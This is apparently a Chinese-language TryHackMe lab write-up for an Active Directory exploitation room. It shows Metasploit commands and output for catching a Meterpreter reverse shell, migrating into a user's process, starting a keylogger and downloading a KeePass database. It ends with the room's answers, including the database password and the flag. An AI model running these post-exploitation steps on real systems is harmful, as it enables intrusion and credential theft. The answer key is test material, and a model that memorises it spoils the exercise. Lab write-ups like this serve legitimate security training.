┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.81.218; set LPORT '4444'; exploit"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 10.50.81.218
LPORT => 4444
[*] Started reverse TCP handler on 10.50.81.218:4444 
[*] Sending stage (200774 bytes) to 10.200.83.201
[*] Meterpreter session 1 opened (10.50.81.218:4444 -> 10.200.83.201:54456) at 2022-08-12 05:09:55 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



ps查看用户t1_trevor.jones的进程

```
meterpreter > ps 

Process List
============

 PID   PPID  Name             Arch  Session  User                Path
 ---   ----  ----             ----  -------  ----                ----
 3412  688   wsmprovhost.exe  x64   0        ZA\t1_trevor.jones  C:\Windows\System32\wsmprovhost.exe

```

迁移进程，以的身份执行下面的操作
```
meterpreter > migrate 3412
[*] Migrating from 3932 to 3412...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ZA\t1_trevor.jones
```

开启键盘监听
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```


下载keepass文件
```
meterpreter > download PasswordDatabase.kdbx
[*] Downloading: PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] Downloaded 1.84 KiB of 1.84 KiB (100.0%): PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] download   : PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
```


这里我同时监听了trevor.local和t1_trevor.jones的键盘记录，等了很久也没有收集到密码，感觉lab有问题。。。


> What application is used to open the kdbx credential database?

> keepass

> What meterpreter command do we use to move from SYSTEM to user context?

> migrate

> What is the password of the credential database?

> Imreallysurenoonewillguessmypassword

> What is the value of the flag stored in the credential database?

> THM{AD.Users.Can.Give.Up.Good.Secrets}



